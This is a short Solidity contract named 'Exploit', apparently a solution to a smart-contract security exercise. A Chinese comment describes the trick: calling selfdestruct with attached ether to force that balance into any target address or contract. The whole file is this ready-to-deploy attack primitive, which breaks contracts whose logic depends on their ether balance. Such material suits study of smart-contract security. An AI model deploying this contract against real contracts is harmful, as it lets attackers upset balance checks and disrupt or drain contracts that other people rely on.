// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

//利用自毁函数，将合约内的余额强行转给任何地址或合约。(调用时带上 msg.value)
contract Exploit {
    //payable
    function self_destruct(address _target) payable public { 
        selfdestruct(payable(_target)); // payble
    }
}
